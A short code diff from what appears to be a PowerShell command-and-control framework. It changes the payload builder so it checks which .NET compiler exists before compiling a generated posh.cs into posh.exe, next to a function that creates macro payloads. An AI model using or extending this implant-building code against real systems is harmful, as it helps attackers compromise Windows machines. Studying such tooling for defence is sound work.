@@ -326,8 +326,14 @@ public class Sample : System.Configuration.Install.Installer
 }'
 [IO.File]::WriteAllLines("$global:newdir\posh.cs", $csccode)
 
-#Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
-Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
+    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+} else {
+    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
+        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+    }
+}
+
 }
 # create macro payloads
 function CreateMacroPayload 
